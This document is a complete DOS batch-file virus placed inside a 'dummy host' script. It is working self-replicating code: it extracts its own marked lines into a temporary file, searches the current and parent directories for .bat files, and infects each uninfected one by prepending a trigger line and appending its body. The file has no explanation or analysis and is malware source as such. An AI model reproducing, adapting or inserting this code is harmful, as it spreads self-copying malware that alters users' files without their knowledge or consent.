@if '%vir%==' goto vir_1
:: dummy host

@if not '%vir%==' goto ViR_x
:ViR_1
@echo off%ViR%
if '%1=='~ goto ViR_%2
if exist \vir_.bat goto ViR_2
if not exist %0.bat goto ViR_3
find "ViR"<%0.bat>\vir_.bat
:ViR_2
command /c \ViR_ ~ 4
:ViR_3
set ViR=x
call %0 %1 %2 %3 %4 %5 %6 %7 %8 %9%_ViR%
set ViR=
goto ViR_x
:ViR_4
for %%a in (*.bat ..\*.bat) do call \ViR_ ~ 5 %%a
exit ViR
:ViR_5
find "ViR"<%3>nul
if not errorlevel 1 goto ViR_x
echo @if '%%vir%%==' goto vir_1>ViR
type %3>>ViR
echo.>>ViR
type \vir_.bat>>ViR
move ViR %3>nul
exit ViR
:ViR_x

